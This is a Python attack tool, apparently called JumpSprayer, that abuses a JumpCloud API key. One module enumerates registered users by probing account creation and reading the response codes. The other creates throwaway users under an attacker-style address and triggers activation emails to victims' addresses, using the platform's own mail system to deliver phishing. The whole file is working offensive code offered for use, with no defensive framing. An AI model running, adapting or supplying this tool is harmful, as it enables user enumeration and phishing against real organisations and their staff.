import requests,sys,json,os
from dotenv import load_dotenv

#load virtual env
load_dotenv()

#apikey and endpoint retrieval from .env
apiURL = os.environ.get('JCAPIENDPOINT')
if not apiURL:
    raise ValueError("JumpCloud api url not set.")
apiKey = os.environ.get('JCAPIKEY')
if not apiKey:
    raise ValueError("JumpCloud apikey not set.")

#HTTP header
headers = {
  "Accept":"application/json",
  "Content-Type":"application/json",
  "x-api-key": apiKey
}

def reader(file_path, start, end):
    try:
        with open(file_path,'r') as file:
            lines = file.readlines()
            users = []
            for i in range(start,end):
                users.append(lines[i].strip())
                #print(lines[i])
            #print(users)
            return users
            #senderEnumeration(users)
    except Exception as error:
        print(f"Error reading file: {error}")

def get_file_size_by_lines(file_path):
    with open(file_path, 'r') as file:
        lines = file.readlines()
        return (len(lines))

def senderEnumeration(usersList):
    for user in usersList:
        #HTTP request payload
        data = {
            "username":user.split('@')[0],
            "email":user
        }
        req = requests.post(apiURL, headers=headers, json=data)
        #print(req.text)
        #User exist and it's registered
        if req.status_code == 400:
            print(user)
        #User doesn't exist
        elif req.status_code == 200:
            reqResult = json.loads(req.text)
            urlDelete = apiURL+"/"+reqResult["_id"]
            reqDelete = requests.delete(urlDelete, headers=headers)
        else:
            sys.exit("An error occurred while sending requests to the API.")

def phishingSender(usersList):
    for user in usersList:
        #HTTP request payload
        data = {
            "username":"durandas",          #random name to register on the domain
            "firstname":user.split('@')[0], #take user in format firstname.lastname@domain.tld
            "email":"dur4ndal@1337.lol"     #random email to register on the domain
        }
        req = requests.post(apiURL,headers=headers,json=data)
        if req.status_code == 200:
            reqResult = json.loads(req.text)
            urlActivate = apiURL+"/"+reqResult["_id"]+"/state/activate"
            payload = {
                "email":user
            }
            reqPhishingSend = requests.post(urlActivate,headers=headers,json=payload)
            print(user, reqPhishingSend.status_code)
            urlDelete = apiURL+"/"+reqResult["_id"]
            reqDelete = requests.delete(urlDelete,headers=headers)
            print(reqDelete.status_code)
        else:
            sys.exit("An error occurred while user register.")


if __name__ == "__main__":
    module = input('JumpSprayer by dur4ndal\nMade with l0v3.\n\n------------------------------------------------------------------------\n\nModule:\n   -UE - User Enumeration.\n   -SM - Send Mail.\nHelp:\n   -h - Show Help message.\n').strip()
    match module:
        case '':    
            sys.exit("Usage: python3 jumpdestroyer.py <file>")
        case '-h':
            sys.exit("You know what the README is for, right?")
        case '-UE':
            size = get_file_size_by_lines(sys.argv[1])
            print('------------------------------------------------------------------------')
            senderEnumeration(reader(sys.argv[1],0,size))
        case '-SM':
            size = get_file_size_by_lines(sys.argv[1])
            print('------------------------------------------------------------------------')
            phishingSender(reader(sys.argv[1],0,size))